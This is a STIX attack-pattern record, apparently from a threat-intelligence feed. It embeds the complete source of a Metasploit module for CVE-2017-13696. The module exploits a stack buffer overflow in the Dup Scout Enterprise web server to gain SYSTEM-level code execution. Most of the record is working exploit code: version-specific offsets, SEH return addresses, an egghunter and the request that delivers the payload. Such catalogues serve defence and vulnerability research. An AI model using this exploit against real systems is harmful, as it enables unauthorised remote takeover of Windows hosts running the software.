{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--98d2c023-9a95-48b1-af34-f3520265a5ca",
    "created": "2024-08-14T16:52:14.875037Z",
    "modified": "2024-08-14T16:52:14.875041Z",
    "name": "Dup Scout Enterprise GET Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in the web interface of Dup Scout Enterprise versions <= 10.0.18 caused by improper bounds checking of the request path in HTTP GET requests sent to the built-in web server which can be leveraged to execute arbitrary code in the context of NT AUTHORITY\\SYSTEM.  This module supports x86 versions of Dup Scout Enterprise and x86 Windows operating systems only and has been tested successfully on Windows 7 SP1 (x86) and Windows XP SP0 (x86).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/dupscts_bof.rb",
            "external_id": "dupscts_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-13696"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Seh\n  include Msf::Exploit::Remote::Egghunter\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Dup Scout Enterprise GET Buffer Overflow',\n        'Description' => %q{\n          This module exploits a stack-based buffer overflow vulnerability\n          in the web interface of Dup Scout Enterprise versions <= 10.0.18,\n          caused by improper bounds checking of the request path in HTTP GET\n          requests sent to the built-in web server which can be leveraged\n          to execute arbitrary code in the context of NT AUTHORITY\\SYSTEM.\n\n          This module supports x86 versions of Dup Scout Enterprise and x86\n          Windows operating systems only and has been tested successfully on\n          Windows 7 SP1 (x86) and Windows XP SP0 (x86).\n        },\n        'License' => MSF_LICENSE,\n        'Author' =>\n          [\n            'vportal', # Vulnerability discovery and PoC\n            'Daniel Teixeira', # Metasploit module\n            'bcoles', # Automatic targetting and additional targets\n          ],\n        'References' =>\n          [\n            ['CVE', '2017-13696'],\n            ['CWE', '121'],\n            ['EDB', '42557'],\n            ['EDB', '49217']\n          ],\n        'DefaultOptions' =>\n          {\n            'EXITFUNC' => 'thread'\n          },\n        'Platform' => 'win',\n        'Arch' => ARCH_X86,\n        'Payload' =>\n          {\n            'BadChars' => \"\\x00\\x09\\x0a\\x0d\\x20\\x26\",\n            'Space' => 500\n          },\n        'Targets' =>\n          [\n            [ 'Automatic', { 'auto' => true } ],\n            [\n              'Dup Scout Enterprise v8.3.16 (x86)',\n              {\n                'Version' => '8.3.16',\n                'Offset' => 552,\n                # 0x10045543 : pop ebx # pop ecx # ret 0x20 | ascii {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0-\n                'Ret' => 0x10045543\n              }\n            ],\n            [\n              'Dup Scout Enterprise v8.4.16 (x86)',\n              {\n                'Version' => '8.4.16',\n                'Offset' => 552,\n                # 0x10045c33 : pop ebx # pop ecx # ret 0x20 | ascii {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0-\n                'Ret' => 0x10045c33\n              }\n            ],\n            [\n              'Dup Scout Enterprise v9.0.28 (x86)',\n              {\n                'Version' => '9.0.28',\n                'Offset' => 552,\n                # 0x1004d983 : pop ebx # pop ecx # ret 0x20 |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0-\n                'Ret' => 0x1004d983\n              }\n            ],\n            [\n              'Dup Scout Enterprise v9.1.14 (x86)',\n              {\n                'Version' => '9.1.14',\n                'Offset' => 552,\n                # 0x10081b78 : pop ebx # pop ecx # ret 0x20 | ascii {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0-\n                'Ret' => 0x10081b78\n              }\n            ],\n            [\n              'Dup Scout Enterprise v9.5.14 (x86)',\n              {\n                'Version' => '9.5.14',\n                'Offset' => 2488,\n                # POP # POP # RET [libspp.dll]\n                'Ret' => 0x10050ff3\n              }\n            ],\n            [\n              'Dup Scout Enterprise v9.9.14 (x86)',\n              {\n                'Version' => '9.9.14',\n                'Offset' => 2496,\n                # 0x10056c1d : pop ebx # pop ecx # ret 0x20 | ascii {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0-\n                'Ret' => 0x10056c1d\n              }\n            ],\n            [\n              'Dup Scout Enterprise v10.0.18 (x86)',\n              {\n                'Version' => '10.0.18',\n                'Offset' => 2496,\n                # 0x10056a16 : pop ebx # pop ecx # ret 0x20 | ascii {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0-\n                'Ret' => 0x10056a16\n              }\n            ],\n          ],\n        'Notes' =>\n          {\n            'Stability' => [ CRASH_SERVICE_DOWN ],\n            'SideEffects' => [ IOC_IN_LOGS ],\n            'Reliability' => [ REPEATABLE_SESSION ]\n          },\n        'Privileged' => true,\n        'DisclosureDate' => '2017-03-15',\n        'DefaultTarget' => 0\n      )\n    )\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => '/',\n      'method' => 'GET'\n    })\n\n    unless res\n      return CheckCode::Unknown('Connection failed.')\n    end\n\n    version = res.body.scan(/>Dup Scout Enterprise v([\\d.]+)</).flatten.first\n\n    unless version\n      return CheckCode::Safe('Target is not Dup Scout Enterprise.')\n    end\n\n    unless target_for_version(version)\n      return CheckCode::Detected(\"No targets for Dup Scout Enterprise version #{version}.\")\n    end\n\n    CheckCode::Appears(\"Dup Scout Enterprise version #{version}.\")\n  end\n\n  def dup_version\n    res = send_request_cgi({\n      'uri' => '/',\n      'method' => 'GET'\n    })\n\n    unless res\n      return fail_with(Failure::Unreachable, 'Could not determine Dup Scout Enterprise version. No reply.')\n    end\n\n    res.body.scan(/>Dup Scout Enterprise v([\\d.]+)</).flatten.first\n  end\n\n  def target_for_version(version)\n    return unless version\n\n    targets.select { |t| version == t['Version'] }.first\n  end\n\n  def exploit\n    my_target = target\n\n    if target.name == 'Automatic'\n      print_status('Selecting a target...')\n      my_target = target_for_version(dup_version)\n      unless my_target\n        fail_with(Failure::NoTarget, 'Unable to automatically detect a target')\n      end\n    end\n\n    print_status(\"Using target: #{my_target.name}\")\n\n    eggoptions = {\n      checksum: true,\n      eggtag: rand_text_alpha(4, payload_badchars)\n    }\n\n    hunter, egg = generate_egghunter(\n      payload.encoded,\n      payload_badchars,\n      eggoptions\n    )\n\n    sploit = rand_text_alpha(my_target['Offset'], payload_badchars)\n    sploit << generate_seh_record(my_target.ret)\n    sploit << hunter\n    sploit << make_nops(10)\n    sploit << egg\n    sploit << rand_text_alpha(5500, payload_badchars)\n\n    print_status(\"Sending payload (#{sploit.length} bytes) ...\")\n\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => sploit\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-03-15",
    "x_mitre_platforms": [
        "win'"
    ]
}